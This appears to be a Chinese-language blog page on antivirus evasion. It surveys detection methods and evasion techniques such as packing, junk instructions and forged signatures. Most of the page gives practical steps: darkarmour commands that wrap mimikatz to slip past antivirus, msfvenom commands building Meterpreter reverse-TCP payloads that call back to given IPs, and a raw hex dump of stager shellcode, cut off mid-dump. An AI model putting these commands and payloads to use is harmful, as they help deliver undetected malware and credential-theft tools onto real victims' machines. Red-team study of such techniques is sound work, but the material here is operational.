      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/%E5%B8%B8%E7%94%A8%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/%E5%B8%B8%E7%94%A8%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="免杀相关概念-简单概述"><a href="#免杀相关概念-简单概述" class="headerlink" title="免杀相关概念(简单概述)"></a>免杀相关概念(简单概述)</h1><blockquote><p>免杀技术全称为反杀毒技术 AV - Anti Anti-Virus 简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含<strong>反汇编、逆向工程、系统漏洞</strong>等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。  </p></blockquote><h2 id="技术分类"><a href="#技术分类" class="headerlink" title="技术分类"></a>技术分类</h2><ol><li>开源免杀：指在有病毒、木马<a href="https://baike.baidu.com/item/%E6%BA%90%E4%BB%A3%E7%A0%81?fromModule=lemma_inlink">源代码</a>的前提下，通过修改源代码进行免杀。</li><li>手工免杀：指在仅有病毒、木马的<a href="https://baike.baidu.com/item/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6?fromModule=lemma_inlink">可执行文件</a>(.exe)（PE文件）的情况下进行免杀</li><li>自动免杀：指的是<a href="https://zh.m.wikipedia.org/wiki/%E7%97%85%E6%AF%92">病毒</a>、木马自身能自动变异，如：千面人病毒</li></ol><h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><blockquote><ul><li><a href="https://baike.baidu.com/item/%E5%85%8D%E6%9D%80">免杀</a></li><li><a href="https://zh.m.wikipedia.org/zh-hans/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF">免杀技术</a></li></ul></blockquote><h1 id="免杀测试环境"><a href="#免杀测试环境" class="headerlink" title="免杀测试环境"></a>免杀测试环境</h1><blockquote><p>Windows原生纯净镜像下载：<a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn</a><br>Windows 10激活密钥：W269N-WFGWX-YVC9B-4J6C9-T83GX<br>火绒：<a href="https://www.huorong.cn/person5.html">https://www.huorong.cn/person5.html</a><br>360安全卫士：<a href="https://weishi.360.cn/">https://weishi.360.cn/</a><br>360安全卫士极速版：<a href="https://weishi.360.cn/jisu/">https://weishi.360.cn/jisu/</a><br>tdm-gcc：<a href="https://jmeubank.github.io/tdm-gcc/download/">https://jmeubank.github.io/tdm-gcc/download/</a><br>mingw-w64：<a href="https://www.mingw-w64.org/downloads/">https://www.mingw-w64.org/downloads/</a> </p><blockquote><p>用的较多</p><ul><li><a href="https://www.mingw-w64.org/downloads/#msys2">https://www.mingw-w64.org/downloads/#msys2</a></li><li><a href="https://www.mingw-w64.org/downloads/#cygwin">https://www.mingw-w64.org/downloads/#cygwin</a></li></ul></blockquote><p>Visual Studio：<a href="https://visualstudio.microsoft.com/zh-hans/">https://visualstudio.microsoft.com/zh-hans/</a></p></blockquote><h1 id="常见查杀方式"><a href="#常见查杀方式" class="headerlink" title="常见查杀方式"></a>常见查杀方式</h1><blockquote><ul><li>静态查杀：对文件进行特征匹配的思路</li><li>云查杀：对文件内容及行为的检测</li></ul><blockquote><p>主要是观察敏感操作</p></blockquote><ul><li>动态查杀：对其产生的行为进行检测</li></ul></blockquote><h2 id="杀软检测技术介绍"><a href="#杀软检测技术介绍" class="headerlink" title="杀软检测技术介绍"></a>杀软检测技术介绍</h2><blockquote><p>每一类型的恶意软件所实施的反检测技术都是不一样的（恶意软件可以分为病毒、木马、僵尸程序、流氓软件、勒索软件、广告程序等）</p></blockquote><h3 id="基于签名的检测"><a href="#基于签名的检测" class="headerlink" title="基于签名的检测"></a>基于签名的检测</h3><blockquote><p>传统的防病毒软件很大程度上依赖于<strong>签名</strong>来识别恶意软件。</p><blockquote><p>如：微软官方工具SysinternalsSuite中具备官方签名：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209081442880.png" alt="image-20220908144213690" style="zoom:50%;" /></blockquote><p>工作原理如下：</p><p>当恶意软件被杀软公司采集后，杀软后台的研究人员以及动态分析系统便会对这些样本进行分析，一旦确定是恶意软件，后台便会提取恶意文件的标签并将其添加到反病毒软件的签名数据库中。</p></blockquote><h3 id="静态程序分析"><a href="#静态程序分析" class="headerlink" title="静态程序分析"></a>静态程序分析</h3><blockquote><p>静态程序分析是在不实际运行程序的情况下进行的分析。</p><p>大部份的静态程序分析的对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。</p></blockquote><h3 id="动态程序分析"><a href="#动态程序分析" class="headerlink" title="动态程序分析"></a>动态程序分析</h3><blockquote><p>动态程序分析是通过在真实或虚拟处理器上执行程序而执行的分析。为了使动态程序分析真实可信，我们必须要能够对各种目标程序的行为进行测试。</p></blockquote><h3 id="沙盒分析技术"><a href="#沙盒分析技术" class="headerlink" title="沙盒分析技术"></a>沙盒分析技术</h3><blockquote><p>沙盒是一个观察计算机病毒的重要环境，用于为一些来源不可信、具备破坏力或无法判定程序意图的程序提供试验环境。</p></blockquote><h3 id="启发式分析"><a href="#启发式分析" class="headerlink" title="启发式分析"></a>启发式分析</h3><blockquote><p>启发式分析是许多计算机防病毒软件使用的一种方法，其被设计用于检测未知的计算机病毒，以及新的病毒变体。<br>启发式分析是<strong>基于专家的分析</strong>，利用它可以对已知或未知的恶意软件进行各种维度的风险衡量，其中多标准分析（MCA）是其中的方法之一，不过启发式分析不是统计分析而是基于可用的数据或统计。</p></blockquote><h3 id="信息熵检测"><a href="#信息熵检测" class="headerlink" title="信息熵检测"></a>信息熵检测</h3><blockquote><p>每个恶意软件都可以被描述成数值性质的属性(例如:信息熵)或者抽象性质的属性，信息熵就是通过找到最合适的量度来验证并且对比恶意软件的属性</p></blockquote><h3 id="其他常见检测技术"><a href="#其他常见检测技术" class="headerlink" title="其他常见检测技术"></a>其他常见检测技术</h3><h4 id="混淆检测"><a href="#混淆检测" class="headerlink" title="混淆检测"></a>混淆检测</h4><blockquote><p>病毒由两个部分组成：载荷（payload）和混淆部件（obfuscator），载荷是用来做坏事的代码，而混淆部件则是病毒用来保护自身免于被查杀的，通常恶意软件开发者都会将其代码进行混淆以降低其代码的可读性<br>所以混淆检测就非常的有针对性。</p></blockquote><h4 id="加壳检测"><a href="#加壳检测" class="headerlink" title="加壳检测"></a>加壳检测</h4><blockquote><p>恶意软件一般都会被压缩加壳，因为加壳会将可执行文件进行压缩打包, 并将压缩数据与解压缩代码组合成单个可执行文件的一种手段。 当执行被压缩过的可执行文件时，解压缩代码会在执行之前从压缩数据中重新创建原始代码。所以检测恶意软件是否使用了加壳技术，也是发现的一种重要手段。</p></blockquote><h4 id="加密检测"><a href="#加密检测" class="headerlink" title="加密检测"></a>加密检测</h4><blockquote><p>恶意软件使用加密对其二进制程序进行加密，以免被逆向分析。加密存在于恶意软件的构建器和存根中，当恶意软件需要解密时，不会用恶意代码常用的正常方法执行它。为了隐藏进程，恶意软件使用了一个有名的RunPE的技术，代码会以挂起的方式执行一个干净的进程（比如iexplorer.exe或者explorer.exe），然后把内存内容修改成恶意代码后再执行。所以检测RunPE的运行，就可以很容易的检测到恶意软件了。</p></blockquote><h2 id="常见杀软特点"><a href="#常见杀软特点" class="headerlink" title="常见杀软特点"></a>常见杀软特点</h2><h3 id="火绒"><a href="#火绒" class="headerlink" title="火绒"></a>火绒</h3><p>一般加壳，加资源，混淆都可绕过，不过火绒静态查杀更新的快，一般刚出的免杀，不久火绒就能查</p><h3 id="360"><a href="#360" class="headerlink" title="360"></a>360</h3><p>360要强一点，加壳不一定能绕，需要一些其他手段</p><h1 id="常见免杀方式"><a href="#常见免杀方式" class="headerlink" title="常见免杀方式"></a>常见免杀方式</h1><h2 id="特征码免杀"><a href="#特征码免杀" class="headerlink" title="特征码免杀"></a>特征码免杀</h2><blockquote><p>特征码: 特征码是识别一个程序是一个病毒的一段不大于64字节的特征串，简单来讲特征码就是一种只在病毒或木马文件内才有的独一无二的特征，它或是一段字符，或是在特定位置调用的一个函数。总之，如果某个文件具有这个特征码，那反病毒软件就会认为它是病毒。反过来，如果将这些特征码从病毒、木马的文件中抹去或破坏掉，那么反病毒软件就认为这是一个正常文件了。</p><p>免杀最基本思想就是破坏特征，这个特征可能是特征码，也可能是行为特征，只要破坏的病毒与木马所固有的特征，并保证其原本的功能没有改变，一次免杀就完成了</p><p>为了减少误报率,一般杀毒软件会提取多段特征串,这时,我们往往改一处就可达到免杀效果,当然有些杀毒软件要同时改几处才能免杀。</p></blockquote><h2 id="花指令免杀"><a href="#花指令免杀" class="headerlink" title="花指令免杀"></a>花指令免杀</h2><blockquote><p>花指令就是一段毫无意义的执行指令，也可以称为垃圾指令（类型加1减1之类的无用语句），花指令对程序的执行结果没有影响。在在静态查杀中，AV是靠特征码来判断文件是否有毒的。我们通过花指令让杀毒软件检测不到特征码，干扰杀毒软件正常的检测。加花以后，一些杀毒软件就检测不出来了，但是有些比较强的杀毒软件，病毒还是会被杀的。 </p><p>常见的就是在程序开头加入一段计算用的汇编指令和一些入口点内存地址的乱跳转，或加上其他常用程序特有的入口指令来迷惑杀毒软件。因为计算与跳转的最后结果是没有实质的意义的，所以这么做并不影响<a href="https://zh.m.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F">程序</a>的正常运行。但能使一些杀毒软件无法正确识别木马程序，从而达到免杀的效果。</p><p>如杀毒软件本来是在 0x00001000  到 0x00005000  处找一个特征码。但因为我们填充了花指令，恶意代码跑到了 0x00008000  这个位置，就会导致特征码查杀失败，从而达到免杀目的。</p><p>花指令撰写方法：找到程序的一个全0代码段</p></blockquote><h2 id="加壳免杀"><a href="#加壳免杀" class="headerlink" title="加壳免杀"></a>加壳免杀</h2><blockquote><p>软件加壳为软件加密，对于现在的壳来说，根据作用与加壳后的不同效果，可以将其分为两类，一类是压缩壳，另一类是加密壳。但不管是<strong>压缩壳还是加密壳</strong>，它们的大致原理与执行流程都是一样的，应用程序加壳后就会变成PE文件里的一段数据，在执行加壳文件时会先执行壳，再由壳将已加密的程序解密并还原到内存中去</p><h3 id="加冷门壳"><a href="#加冷门壳" class="headerlink" title="加冷门壳"></a>加冷门壳</h3><blockquote><p>举例来说，如果说程序是一张烙饼，那壳就是包装袋，可以让你发现不了包装袋里的东西是什么。比较常见的壳一般容易被杀毒软件识别，所以加壳有时候会使用到生僻壳，就是不常用的壳。去买口香糖你会发现至少有两层包装，所以壳也可以加多重壳，让杀毒软件看不懂。如果你看到一个袋子上面写着干燥剂、有毒之类的字你也许就不会对他感兴趣了吧，这就是伪装壳，把一种壳伪装成其他壳，干扰杀毒软件正常的检测。</p></blockquote><h3 id="加壳改壳"><a href="#加壳改壳" class="headerlink" title="加壳改壳"></a>加壳改壳</h3><blockquote><p>加壳改壳是病毒免杀常用的手段之一，加壳改壳原理是将一个木马文件加上upx壳或者其它壳后用lordpe将文件<a href="https://baike.baidu.com/item/%E5%85%A5%E5%8F%A3%E7%82%B9?fromModule=lemma_inlink">入口点</a>加1，然后将区段字符全部去掉，然后用od打开免杀的木马在入口上下100字符内修改一些代码让杀毒软件查不出来是什么壳就不知道怎么脱就可以实现免杀的目的，但这种技术只有熟悉汇编语言的人才会，这种免杀方法高效可以一口气过众多杀软也是免杀爱好者应该学会的一种技术。</p></blockquote><h3 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h3><blockquote><p>加密是将明文信息隐匿起来，使之在缺少特殊信息时全部或部分数据不可读，令杀毒软件无从下手。</p><p>而解密就是令在宿主电脑中的病毒得到密钥，从而突然发作。</p></blockquote></blockquote><h2 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h2><blockquote><p>将 shellcode  和加载器分离</p><p>比如，一般杀软只会对 exe 文件进行查杀，但是我们将 shellcode 写入到图片中，那么杀软只会认为它是正常的图片，然后我们通过加载器将 shellcode 读取出来，加载进内存执行</p></blockquote><h2 id="资源修改"><a href="#资源修改" class="headerlink" title="资源修改"></a>资源修改</h2><blockquote><p>有些杀软会设置有扫描⽩名单，⽐如之前把程序图标替换为360安全卫⼠图标就能 过360的查杀。 </p><ul><li>加资源：使⽤ ResHacker 对⽂件进⾏资源操作，找来多个正常软件，将它们的资源加⼊到⾃⼰软件， </li><li>替换资源：使⽤ ResHacker 替换⽆⽤的资源（Version等）。 </li><li>加签名：使⽤签名伪造⼯具，将正常软件的签名信息加⼊到⾃⼰软件中。</li></ul></blockquote><h2 id="改程序入口点"><a href="#改程序入口点" class="headerlink" title="改程序入口点"></a>改程序入口点</h2><blockquote><p><a href="https://zh.m.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3%E7%82%B9">程序入口点</a>修改就是改变入口点，通常用到的方法是在入口点的地址加1或把入口点地址拆开，也有加花指令之后把原入口点修改到花指令的入口点上令电脑先处理那段没意义的指令，再在花指令后再加跳转<a href="https://zh.m.wikipedia.org/wiki/%E4%BB%A3%E7%A0%81">代码</a>，跳转到程序执行数据的入口点上，令程序正常运行。</p></blockquote><h2 id="免杀修改技巧——修改内存特征码："><a href="#免杀修改技巧——修改内存特征码：" class="headerlink" title="免杀修改技巧——修改内存特征码："></a>免杀修改技巧——修改内存特征码：</h2><blockquote><p>1.直接修改特征码的十六进制法</p><p>2.修改字符串大小写法</p><p>3.等价替换法</p><p>4.指令顺序调换法</p><p>5.通用跳转法</p></blockquote><h2 id="最新的无特征免杀法"><a href="#最新的无特征免杀法" class="headerlink" title="最新的无特征免杀法"></a>最新的无特征免杀法</h2><blockquote><p>何为无特征免杀法？就是脱离传统的定位方法，直接盲免，就对于整体区段进行异或加密，是整体代码发生变换，从而逃脱杀毒软件的查杀，是当今最流行的方法。 </p></blockquote><h1 id="darkarmour"><a href="#darkarmour" class="headerlink" title="darkarmour"></a>darkarmour</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p><a href="https://github.com/bats3c/darkarmour">https://github.com/bats3c/darkarmour</a></p></blockquote><p>直接使用GitHub上面的恶意木马是会直接被查杀，文件落地就会被直接查杀。darkarmour直接从内存加载文件。从内存中存储和执行加密的 Windows 二进制文件，无需任何磁盘操作。木马在内存中加壳绕过静态检测。注意经由darkarmour加密的可执行文件，大概率是可过杀软的~~~应用范围更广</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote><p>它使用 python标准库，因此无需担心任何 python 依赖项，因此您可能遇到的唯一问题是二进制依赖项。</p><ul><li>Linux下：（建议在linux上操作）</li></ul><blockquote><p> 所需的二进制文件是： i686-w64-mingw32-g++ 、 i686-w64-mingw32-gcc  和 upx（也可能是 osslsigncode ）。这些都可以通过apt安装</p></blockquote><ul><li>windows下：</li></ul><blockquote><p>mingw-w64前面有讲到的编译器</p></blockquote></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode</span><br></pre></td></tr></table></figure><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help 显示此帮助信息并退出</span><br><span class="line">-f FILE, --file FILE 要加密的文件，如果没有被告知，则假定为二进制文件</span><br><span class="line">-e ENCRYPT, --encrypt ENCRYPT 要使用的加密算法(xor),只有xor</span><br><span class="line">-S SHELLCODE, --shellcode SHELLCODE 包含shellcode的文件，需要 &quot;msfvenom -f raw&quot;的格式。</span><br><span class="line">-b, --binary 如果文件是二进制的exe文件，则提供。</span><br><span class="line">-d, --dll 使用反射性dll注入，在另一个进程中执行二进制文件</span><br><span class="line">-u, --upx 用upx打包可执行文件</span><br><span class="line">-j, --jmp 使用基于jmp的pe加载器，就是将可执行文件直接加载到内存</span><br><span class="line">-r, --runpe 使用runpe来加载pe</span><br><span class="line">-s, --source 如果文件是c源代码，则提供该文件。</span><br><span class="line">-k KEY, --key KEY 用于加密的密钥，如果没有提供，则随机生成。提供</span><br><span class="line">-l LOOP, --loop LOOP 加密级别的数量,循环加密的次数</span><br><span class="line">-o OUTFILE, --outfile OUTFILE 输出文件的名称，如果没有提供，则随机分配文件名 会被分配到</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.sohu.com/a/167142473_604699#:~:text=XOR%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E6%98%AF%3A%E5%BD%93%E4%B8%80%E4%B8%AA%E6%95%B0A%E5%92%8C%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%95%B0B%E8%BF%9B%E8%A1%8C%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E4%BC%9A%E7%94%9F%E6%88%90%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%95%B0C%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%86%8D%E5%B0%86C%E5%92%8CB%E8%BF%9B%E8%A1%8C%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E5%88%99C%E5%8F%88%E4%BC%9A%E8%BF%98%E5%8E%9F%E4%B8%BAA%E3%80%82,%E7%9B%B8%E5%AF%B9%E4%BA%8E%E5%85%B6%E4%BB%96%E7%9A%84%E7%AE%80%E6%98%93%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%EF%BC%8CXOR%E7%AE%97%E6%B3%95%E7%9A%84%E4%BC%98%E7%82%B9%E5%A6%82%E4%B8%8B%E3%80%82%20%281%29%E7%AE%97%E6%B3%95%E7%AE%80%E5%8D%95%EF%BC%8C%E5%AF%B9%E4%BA%8E%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E5%BE%88%E5%AE%B9%E6%98%93%E8%83%BD%E5%AE%9E%E7%8E%B0%E3%80%82">简易的加密算法——XOR 加密</a></p></blockquote><h2 id="实战免杀mimikatz"><a href="#实战免杀mimikatz" class="headerlink" title="实战免杀mimikatz"></a>实战免杀mimikatz</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python darkarmour.py -f mimikatz.exe -j -l 5 -e xor -o darkmeter.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#加壳</span><br><span class="line">upx darkmeter.exe</span><br><span class="line">#darkmeter.exe就是被包裹后的mimkatz，能过免杀，如果失败也不要气馁，免杀失败很正常，可以试一试将loop次数提高或者减少</span><br></pre></td></tr></table></figure><h2 id="实战MSF免杀"><a href="#实战MSF免杀" class="headerlink" title="实战MSF免杀"></a>实战MSF免杀</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.133 lport=4001 -f exe -o 4001.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.58.133 -P 4001</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python darkarmour.py -f 4001.exe -j -l 6 -e xor -o dark4001.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upx dark4001.exe</span><br></pre></td></tr></table></figure><h1 id="掩日-适用于红队的综合免杀工具"><a href="#掩日-适用于红队的综合免杀工具" class="headerlink" title="掩日 - 适用于红队的综合免杀工具"></a>掩日 - 适用于红队的综合免杀工具</h1><p>图形化工具</p><blockquote><p><a href="https://github.com/1y0n/AV_Evasion_Tool">AV_Evasion_Tool</a></p></blockquote><h1 id="免杀学习（强烈推荐）"><a href="#免杀学习（强烈推荐）" class="headerlink" title="免杀学习（强烈推荐）"></a>免杀学习（强烈推荐）</h1><blockquote><p><a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p></blockquote><p>把这些项目都做一遍~~无敌</p><h1 id="shellcode简介"><a href="#shellcode简介" class="headerlink" title="shellcode简介"></a>shellcode简介</h1><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。</p><p>简单理解就是：shellcode是一段执行某些动作的机器码。</p><p>在计算机安全中，shellcode是一小段代码，可以用于软件漏洞利用的载荷。被称为“shellcode”是因为它通常启动一个命令终端，攻击者可以通过这个终端控制受害的计算机，但是所有执行类似任务的代码片段都可以称作shellcode。Shellcode通常是以机器码形式编写的，所以我们要学习硬编码。</p><p>需要注意到的是，shellcode可以在内存中直接执行某些操作，比如说让我们上线到cs，上线到msf，这些都是shellcode在内存中做的事</p><blockquote><p><a href="https://www.cnblogs.com/DeeLMind/p/6856133.html">ShellCode入门（提取ShellCode）</a></p></blockquote><h1 id="shellcode-launch"><a href="#shellcode-launch" class="headerlink" title="shellcode-launch"></a>shellcode-launch</h1><blockquote><p>加载shellcode的  </p></blockquote><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><blockquote><p><a href="https://github.com/jax777/shellcode-launch">https://github.com/jax777/shellcode-launch</a></p></blockquote><h2 id="安装GO环境"><a href="#安装GO环境" class="headerlink" title="安装GO环境"></a>安装GO环境</h2><blockquote><p>跨平台</p></blockquote><h3 id="Go-安装"><a href="#Go-安装" class="headerlink" title="Go 安装"></a>Go 安装</h3><blockquote><ul><li>GO  下载页面：<a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></li><li>Go  安装的目录路径：D:\Program Files\Go</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#go env查看</span></span><br><span class="line">GOROOT=D:\Program Files\Go</span><br></pre></td></tr></table></figure></blockquote><h3 id="Go-环境配置"><a href="#Go-环境配置" class="headerlink" title="Go 环境配置"></a>Go 环境配置</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看 Go 环境变量</span></span><br><span class="line">go env</span><br><span class="line"><span class="comment"># 设置 Go 环境变量</span></span><br><span class="line">go env <span class="literal">-w</span> GO111MODULE=auto</span><br></pre></td></tr></table></figure><h3 id="GOPATH"><a href="#GOPATH" class="headerlink" title="GOPATH"></a>GOPATH</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setx命令：在用户或系统环境创建或修改环境变量。能基于参数、注册表项或文件输入设置变量。</span></span><br><span class="line"><span class="comment">#使用/M表示在系统写入，不/M表示写入用户变量</span></span><br><span class="line"><span class="comment">#格式： SETX [/S system [/U [domain\]user [/P [password]]]] var value [/M]</span></span><br><span class="line"><span class="comment">#主要是是var和value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#代码编写位置（管理员权限）</span></span><br><span class="line">setx GOPATH <span class="string">&quot;F:\Learning\ComputerScience\Code\GO&quot;</span> /M</span><br><span class="line"><span class="comment">#若被拒绝：（不过这样仅仅是写入用户变量）</span></span><br><span class="line">setx GOPATH <span class="string">&quot;F:\Learning\ComputerScience\Code\GO&quot;</span></span><br><span class="line"><span class="comment">#添加到系统环境变量</span></span><br><span class="line">setx /M PATH <span class="string">&quot;<span class="variable">$Env:PATH</span>;F:\Learning\ComputerScience\Code\GO;D:\Program Files\Go\bin&quot;</span></span><br><span class="line"><span class="comment">#注意哦，使用setx一定要谨慎，</span></span><br><span class="line"><span class="comment">#如果是在环境变量后面追加值，一定不要忘记带上原变量，否则我们会覆盖掉原变量，而失去原变量。如果要追加在后面的话，一定要:</span></span><br><span class="line">setx /M PATH <span class="string">&quot;<span class="variable">$Env:PATH</span>;&lt;path to add&gt;&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>注：若是出现截断的情况，建议手动添加环境变量</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209112048354.png" alt="image-20220911204822039"></p></blockquote><p>在 GOPATH  目录下新建三个文件夹</p><ul><li>src ：存放源码文件</li></ul><blockquote><ul><li>项目1</li></ul><blockquote><p>模块1<br>模块2</p></blockquote><ul><li>项目2</li></ul><blockquote><p>模块1<br>模块2</p></blockquote><ul><li>shellcode-launch</li></ul></blockquote><ul><li>bin ：存放编译后生成的二进制可执行文件</li><li>pkg ：存放编译后生成的归档文件（go module）</li></ul><h2 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h2><h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/jax777/shellcode<span class="literal">-launch</span>.git</span><br><span class="line"><span class="built_in">cd</span> shellcode<span class="literal">-launch</span></span><br></pre></td></tr></table></figure><h3 id="MSF或CS生成C的shellcode"><a href="#MSF或CS生成C的shellcode" class="headerlink" title="MSF或CS生成C的shellcode"></a>MSF或CS生成C的shellcode</h3><blockquote><p>我们如果需要借助shellcode-launch上线msf就要有一串上线msf的shellcode~，cs亦是同理</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#msf</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=124.223.217.243 lport=4567 -f c -o shellcode.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#cs</span><br><span class="line">attack -&gt; payload -&gt;</span><br><span class="line">payload选择c或者raw（原始的）</span><br><span class="line"></span><br><span class="line">#如：</span><br><span class="line">#raw：</span><br><span class="line">fc48 83e4 f0e8 c800 0000 4151 4150 5251</span><br><span class="line">5648 31d2 6548 8b52 6048 8b52 1848 8b52</span><br><span class="line">2048 8b72 5048 0fb7 4a4a 4d31 c948 31c0</span><br><span class="line">ac3c 617c 022c 2041 c1c9 0d41 01c1 e2ed</span><br><span class="line">5241 5148 8b52 208b 423c 4801 d066 8178</span><br><span class="line">180b 0275 728b 8088 0000 0048 85c0 7467</span><br><span class="line">4801 d050 8b48 1844 8b40 2049 01d0 e356</span><br><span class="line">48ff c941 8b34 8848 01d6 4d31 c948 31c0</span><br><span class="line">ac41 c1c9 0d41 01c1 38e0 75f1 4c03 4c24</span><br><span class="line">0845 39d1 75d8 5844 8b40 2449 01d0 6641</span><br><span class="line">8b0c 4844 8b40 1c49 01d0 418b 0488 4801</span><br><span class="line">d041 5841 585e 595a 4158 4159 415a 4883</span><br><span class="line">ec20 4152 ffe0 5841 595a 488b 12e9 4fff</span><br><span class="line">ffff 5d6a 0049 be77 696e 696e 6574 0041</span><br><span class="line">5649 89e6 4c89 f141 ba4c 7726 07ff d548</span><br><span class="line">31c9 4831 d24d 31c0 4d31 c941 5041 5041</span><br><span class="line">ba3a 5679 a7ff d5eb 735a 4889 c141 b861</span><br><span class="line">1e00 004d 31c9 4151 4151 6a03 4151 41ba</span><br><span class="line">5789 9fc6 ffd5 eb59 5b48 89c1 4831 d249</span><br><span class="line">89d8 4d31 c952 6800 0240 8452 5241 baeb</span><br><span class="line">552e 3bff d548 89c6 4883 c350 6a0a 5f48</span><br><span class="line">89f1 4889 da49 c7c0 ffff ffff 4d31 c952</span><br><span class="line">5241 ba2d 0618 7bff d585 c00f 859d 0100</span><br><span class="line">0048 ffcf 0f84 8c01 0000 ebd3 e9e4 0100</span><br><span class="line">00e8 a2ff ffff 2f51 7345 5400 354f 2150</span><br><span class="line">2540 4150 5b34 5c50 5a58 3534 2850 5e29</span><br><span class="line">3743 4329 377d 2445 4943 4152 2d53 5441</span><br><span class="line">4e44 4152 442d 414e 5449 5649 5255 532d</span><br><span class="line">5445 5354 2d46 494c 4521 2448 2b48 2a00</span><br><span class="line">354f 2150 2500 5573 6572 2d41 6765 6e74</span><br><span class="line">3a20 4d6f 7a69 6c6c 612f 352e 3020 2863</span><br><span class="line">6f6d 7061 7469 626c 653b 204d 5349 4520</span><br><span class="line">392e 303b 2057 696e 646f 7773 204e 5420</span><br><span class="line">362e 313b 2057 696e 3634 3b20 7836 343b</span><br><span class="line">2054 7269 6465 6e74 2f35 2e30 290d 0a00</span><br><span class="line">354f 2150 2540 4150 5b34 5c50 5a58 3534</span><br><span class="line">2850 5e29 3743 4329 377d 2445 4943 4152</span><br><span class="line">2d53 5441 4e44 4152 442d 414e 5449 5649</span><br><span class="line">5255 532d 5445 5354 2d46 494c 4521 2448</span><br><span class="line">2b48 2a00 354f 2150 2540 4150 5b34 5c50</span><br><span class="line">5a58 3534 2850 5e29 3743 4329 377d 2445</span><br><span class="line">4943 4152 2d53 5441 4e44 4152 442d 414e</span><br><span class="line">5449 5649 5255 532d 5445 5354 2d46 494c</span><br><span class="line">4521 2448 2b48 2a00 354f 2150 2540 4150</span><br><span class="line">5b34 5c50 5a58 3534 2850 5e29 3743 4329</span><br><span class="line">377d 2445 4943 4152 2d53 5441 4e44 4152</span><br><span class="line">442d 414e 5449 5649 5255 532d 5445 5354</span><br><span class="line">2d46 494c 4521 2448 2b48 2a00 354f 2150</span><br><span class="line">2540 4150 5b00 41be f0b5 a256 ffd5 4831</span><br><span class="line">c9ba 0000 4000 41b8 0010 0000 41b9 4000</span><br><span class="line">0000 41ba 58a4 53e5 ffd5 4893 5353 4889</span><br><span class="line">e748 89f1 4889 da41 b800 2000 0049 89f9</span><br><span class="line">41ba 1296 89e2 ffd5 4883 c420 85c0 74b6</span><br><span class="line">668b 0748 01c3 